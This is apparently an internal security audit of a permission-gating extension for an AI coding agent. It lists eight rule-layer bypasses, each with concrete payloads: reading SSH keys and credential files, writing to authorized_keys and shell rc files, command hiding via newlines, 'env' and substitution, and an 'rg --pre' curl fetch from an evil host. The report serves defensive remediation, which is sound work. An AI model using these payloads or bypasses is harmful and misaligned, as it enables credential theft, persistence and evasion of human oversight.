# Rule-Layer Security Audit Report

Audit date: 2026-08-26 (first round) / 2026-08-26 (re-scan review, repository renamed pi-verdict, pre-open-source window)
Audit target: `extensions/auto-mode.ts` rule layer (bash allowlist + path sensitivity grading)
Status: **All 8 vulnerabilities remain unfixed**—re-scan testing confirms all attack payloads still return `allow`

> Internal document: contains specific attack payloads and line-number locations. The repository is in a pre-public-release window (npm publish ready + CI configured); before committing, decide whether to make it public with the repository.

---

## Audit Scope and Method

- First round: entire repository (line-by-line review of all non-Markdown files + secret scanning of all Markdown/lock files + secret-pattern scanning of commit messages across full git history and `git log -p --all`); the 8 suspected vulnerabilities were independently re-reviewed item by item via parallel false-positive-filtering subtasks, and all were confirmed as true positives (confidence 8-10/10)
- Re-scan: line-by-line comparison of current code against the first-round version (byte-for-byte identical, rule layer untouched), and in-memory execution of the repository's real `classifyBash`/`classifyByRules` using `Bun.Transpiler` to test the verdicts for all attack payloads (without actually running system commands)

## Security Model (Audit Premise)

- The Pi runtime defaults to YOLO mode; this extension is the only permission gate
- Rule-layer `allow` = direct execution with zero human confirmation (`extensions/auto-mode.ts:586-590`), and it **completely short-circuits** the layer 2 model classifier
- Untrusted input surface = tool_call parameters issued by the agent (prompt injection → agent can issue arbitrary commands)
- Therefore, rule-layer allow bypass = complete breach; the following 8 items are all concrete failures of core security functionality

## Observed Verdict Summary (Re-scan, 2026-08-26)

| # | Vulnerability | Observed payload (excerpt) | Verdict |
|---|------|-----------------|------|
| V1 | No path check on bash file operands | `cat ~/.ssh/id_rsa` | ALLOW |
| V2 | No check on `>`/`>>` redirection targets | `echo evil-line > ~/.ssh/authorized_keys` | ALLOW |
| V3 | Newline/`&`/`$()`/`<()` hides commands | `ls\nbash /tmp/evil.sh` | ALLOW |
| V4 | `env` prefix executes arbitrary commands | `env npx -y evil-pkg` | ALLOW |
| V5 | `rg` `--pre` check is dead code | `rg --pre=sh pattern` | ALLOW |
| V6 | `OUTPUT_FLAG_COMMANDS` short-circuit disables `-o` check | `sort -o ~/.bashrc payload.txt` | ALLOW |
| V7 | git flag exact match, `--output=` bypass | `git log --format=x --output=~/Library/LaunchAgents/x.plist` | ALLOW |
| V8 | S0 secret path list omission | `read ~/.npmrc` | ALLOW |

**Control group** (proves the bypasses are real and effective):

- `npm install evil-pkg` alone → `GRAY` (correctly handed to classifier); wrapping with `env` or appending after an allowlist first word → `ALLOW` (proof of V3/V4 effectiveness)
- `read ~/.ssh/id_rsa` → `DENY` (S0 control exists but the list is incomplete; proof of V8 effectiveness)

---

## V1: No Path Check on bash File Operands (Arbitrary Sensitive File Read)

- Location: `extensions/auto-mode.ts:167` (allowlist lines 46-53; `classifyPath` lines 193-207)
- Severity: High (confidence 9/10)
- Description: S0/S1 path grading is applied only to the `path` parameter of the `read/write/edit/grep/find/ls` tools; file operands of bash commands never undergo any path check. `cat`/`grep`/`head`/`jq`/`less` are all in the unconditional allowlist, and a match is allowed. The same policy would be a hard S0 deny via the read tool, but switching to bash `cat` bypasses it; S1 system paths (such as `cat /etc/*`) are likewise downgraded from gray to hard allow.
- Observed payloads: `cat ~/.ssh/id_rsa`, `cat ~/.aws/credentials`, `jq . ~/.pi/agent/auth.json` → all ALLOW
- Exploitation scenario: an injected agent calls bash to execute `cat ~/.ssh/id_rsa` → rule layer deterministically allows it → private keys/cloud credentials enter the model context and can be exfiltrated via model responses
- Remediation recommendation: reuse `classifyPath`'s S0/S1 grading for file operands of allowlisted commands (positional arguments, `-f`-type flags); or downgrade to gray when a bash allowlisted command contains `~`/absolute-path operands

## V2: No Check on Output Redirection Targets (Arbitrary File Write)

- Location: `extensions/auto-mode.ts:155-174` (the only redirection rule in the dangerous regex covers only bare block devices, line 77)
- Severity: High (confidence 9/10)
- Description: `classifyBash` only extracts the command name from each segment and compares it with the allowlist; it never checks `>`/`>>` redirection targets. Meanwhile, the S1/S2 rules of `classifyPath` (lines 188-189) explicitly list protected paths such as `authorized_keys`, `.bashrc/.zshrc`—the design intent is to intercept these writes, but that check is only attached to the write/edit tools, so bash redirection completely bypasses it. A single `echo` is enough to complete the exploit, with no staging needed.
- Observed payloads: `echo evil-line > ~/.ssh/authorized_keys`, `echo export PATH=~/bin:$PATH >> ~/.zshrc` → all ALLOW
- Exploitation scenario: write `authorized_keys` to gain SSH persistence; write rc files to achieve RCE on next shell start; zero confirmation throughout
- Remediation recommendation: parse each segment's redirection target and apply write-path grading (S0/S1/S2 deny, gray outside CWD); if it cannot be parsed reliably, downgrade the entire segment to gray
- Note: README.md:95 states *"revisit if real traffic shows sensitive-path redirects slipping through"*—the redirection bypass has been identified as a known risk but remains unfixed

## V3: Shell Combination Operators Hide Commands (Skip Classifier)

- Location: `extensions/auto-mode.ts:95` (`splitShellChain` lines 93-98; the powershell branch at lines 212-213 reuses the same function)
- Severity: High (confidence 9/10)
- Description: `splitShellChain` splits only on `&&`/`||`/`;`/`|`; newlines, a single `&`, command substitution `$(...)`, process substitution `<(...)`, and backticks are all outside the splitting and checking scope, and `segmentArgv` checks only the first word. Hanging the real command after an allowlist first word can completely bypass the classifier. The README's "Known Limitations" acknowledges over-splitting of operators inside quotes (false-positive direction), which is the opposite failure mode from the missed detection here (false-negative direction).
- Observed payloads: `ls\nbash /tmp/evil.sh`, `cat foo & npm install evil-pkg`, `git log\nnpm install left-pad`, `echo $(bash /tmp/evil.sh)`, `cat <(npx -y evil-pkg)` → all ALLOW
- Exploitation scenario: after prompt injection, the agent issues `ls\nbash /tmp/evil.sh` → rule layer allows it → arbitrary command executes without confirmation
- Remediation recommendation: introduce shell AST parsing (`research/rule-engine-sim/measure.ts` has verified that the tree-sitter-bash approach can be reused); or conservatively downgrade—any command containing newline/`&`/`$(`/`<(`/backticks becomes gray

## V4: `env` Prefix Executes Arbitrary Commands

- Location: `extensions/auto-mode.ts:52`
- Severity: High (confidence 9/10)
- Description: `env` is in the unconditional safe set, but `env <cmd> <args>` semantically executes `<cmd>`. `segmentArgv` only strips `VAR=value` prefixes; `env` does not match that form, so argv[0] is `env`, a match is allowed, and the command after it is never checked; basename normalization makes the `/usr/bin/env` form bypass as well. The allowlist comment claims "read-only/no-side-effect commands", which contradicts the semantics of `env`.
- Observed payloads: `env npx -y evil-pkg`, `env pip install evil` → all ALLOW (the bare command should be GRAY)
- Exploitation scenario: `env npx -y <malicious npm package>` (npx directly downloads and executes) → arbitrary code execution; `env python -c`, `env node -e`, `env bash script.sh` are the same
- Remediation recommendation: move `env` out of the unconditional set and make it a conditional rule—recursively apply allowlist/conditional checks to the tokens following `env`

## V5: Unconditional `rg` Allow Makes the `--pre` Check Dead Code (Arbitrary Command Execution)

- Location: `extensions/auto-mode.ts:51` (`RG_FORBIDDEN` defined at line 65, unreachable check at lines 122-123)
- Severity: High (confidence 9/10)
- Description: `rg` is in the unconditional allowlist, and a match at line 167 directly `continue`s, so the `RG_FORBIDDEN` check in `isConditionalSafe` for rg (`--pre`, etc.) is unreachable dead code—the author intended to intercept `--pre`, but the check order defeats that intent. ripgrep's `--pre=<cmd>` executes that command on every searched file. Additional flaw: `RG_FORBIDDEN.has(t)` is an exact match, so the attached form `--pre=<cmd>` cannot be caught even if the check were reachable.
- Observed payloads: `rg --pre=sh pattern`, `rg --pre /bin/sh pattern` → all ALLOW
- Exploitation scenario: `rg --pre='bash -c "curl http://evil/x.sh -o /tmp/x"' pattern .` → rule layer allows it → ripgrep executes the attacker's command on every file
- Remediation recommendation: move `rg` into the conditional allowlist, and change the flag check to prefix matching (`t === f || t.startsWith(f + "=")`)
- Note: the `-s`/`--set` check for `date` (lines 132-133) is likewise dead code, with lower impact

## V6: `OUTPUT_FLAG_COMMANDS` Short-Circuit Disables the `-o` File-Write Check (Arbitrary File Write)

- Location: `extensions/auto-mode.ts:170` (set defined at line 66; short-circuited check at lines 124-128)
- Severity: High (confidence 10/10)
- Description: `if (OUTPUT_FLAG_COMMANDS.has(cmd) || isConditionalSafe(argv)) continue;` — `sort/base64/iconv/shuf` are directly allowed when they match the set, and the `||` short-circuit makes the `-o/--output` interception for these commands at lines 124-128 unreachable dead code. Additional flaw: the check at line 128 is itself an exact match, so the attached form `--output=<path>` cannot be caught even if it were reachable.
- Observed payloads: `sort -o ~/.bashrc payload.txt`, `sort --output=~/.bashrc payload.txt`, `iconv -o /tmp/x in.txt` → all ALLOW
- Exploitation scenario: write `payload.txt` inside CWD (allowed by the rule at line 205), then execute `sort -o ~/.bashrc payload.txt` → overwrite a file at an arbitrary path with fully controlled content (rc file/authorized_keys persistence)
- Remediation recommendation: remove the `OUTPUT_FLAG_COMMANDS.has(cmd) ||` branch so everything goes through `isConditionalSafe`, and change the `-o` interception to prefix matching to cover the `--output=<path>` form

## V7: git Forbidden-Flag Exact Matching, `=` Attached Form Bypasses (Arbitrary Content Write to Arbitrary File)

- Location: `extensions/auto-mode.ts:114` (set defined at lines 60-63; `log` in `GIT_READONLY_SUBCOMMANDS` at lines 56-59)
- Severity: Medium (confidence 9/10)
- Description: `rest.some((t) => GIT_FORBIDDEN_FLAGS.has(t))` is exact token equality; attached forms such as `--output=/path`, `--git-dir=/x`, `--work-tree=/x`, `--exec=`, `--ext-diff=`, `--textconv=` are not equal to the bare flags in the set. The output content of `git log --format=<literal text> --output=<path>` is entirely controlled by the `--format` literal and is written to an arbitrary path (documented git-log behavior).
- Observed payload: `git log --format=x-cron-line --output=~/Library/LaunchAgents/x.plist` → ALLOW
- Exploitation scenario: write `authorized_keys`/crontab/rc files to achieve zero-confirmation persistence
- Remediation recommendation: change the flag check to prefix matching (`t === f || t.startsWith(f + "=")`), or downgrade git invocations containing `--output`/`-o` to gray
- Note: the written content repeats according to the number of commits in the repo (with multi-commit repos the XML plist may be malformed; the authorized_keys/crontab scenarios are unaffected)

## V8: S0 Secret Path List Omits Common Credential Files

- Location: `extensions/auto-mode.ts:184-187` (read branch lines 218-226)
- Severity: Medium (confidence 8/10)
- Description: S0_SECRET is intended to cover credential files (already includes `.ssh/`, `.aws/`, `.gnupg/`, `.env*`, `id_rsa`, `*.pem`, `credentials`, gh CLI config), but misses `~/.netrc`, `~/.npmrc`, `~/.pypirc`, `~/.kube/config`, `~/.docker/config.json`, `.envrc`, and other standard plaintext credential files—a concrete inconsistency in the control itself, rather than a generalized hardening gap. grep/find/ls share the same read branch, so the leak surface is not limited to the read tool; V1's `cat` bypass completely disables the bash side of that list.
- Tested payloads: `read ~/.npmrc`, `~/.netrc`, `~/.kube/config`, `~/.docker/config.json` → all ALLOW
- Exploitation scenario: read `~/.npmrc` (registry `_authToken`) or `~/.netrc` (plaintext password) → credentials enter the model context and are exfiltrated
- Remediation recommendation: expand S0 to `\.netrc$`, `\.npmrc$`, `\.pypirc$`, `\.kube(/|$)`, `\.docker/config\.json$`, `\.vault-token`, `\.gem/credentials`, `\.envrc`; path checks should be based on `realpath` (the current string regex does not resolve symlinks)

---

## Excluded areas (no vulnerabilities found)

- git history/commit message: full-history secret-pattern scan had zero hits (including the pre-open-source sensitive-information redaction commit `93a66d7`)
- `research/cache-sim/fetch-io.ts`: only sends requests to the Langfuse address provided by an environment variable; responses are only analyzed via `JSON.parse` and never eval'd; all credentials come from environment variables
- `research/rule-engine-sim/measure.ts`: `new Function` only executes source code slices from this repository itself (trusted input)
- `--auto-mode-debug` logs: only record command lines/paths, not secrets

## Common root cause and remediation priority

Root cause: the allowlist layer only looks at the first word of a segment + no shell AST + no file operand/redirection target checks + exact flag matching.

Remediation priority: **V3/V4/V5 (direct RCE) → V1/V2 (credential theft/persistence) → V6/V7 → V8**.

Low-cost quick fixes (recommended for the pre-release window):

1. V4: move `env` out of `BASH_SAFE_UNCONDITIONAL` (one line)
2. V5: move `rg` into the `isConditionalSafe` conditional branch + prefix matching (several lines)
3. V6: remove the `OUTPUT_FLAG_COMMANDS.has(cmd) ||` short-circuit at line 170 (one line) + change line 128 to prefix matching
4. V7: change line 114 to prefix matching (one line)
5. V3: conservative downgrade—commands containing newlines/`&`/`$(`/`<(`/backticks are all gray (several lines)
6. V8: expand the S0 regex list (several lines)

Unified architectural fix (mid-term): tree-sitter-bash AST parsing + redirection target/file operand extraction + `classifyPath` unified classification—resolves V1/V2/V3/V5/V6/V7 at once (`research/rule-engine-sim/measure.ts` has verified feasibility; it was previously deferred due to benefit measurement conclusions, see `research/rule-engine-sim/README.md`; the security audit conclusion supports re-evaluating that decision).
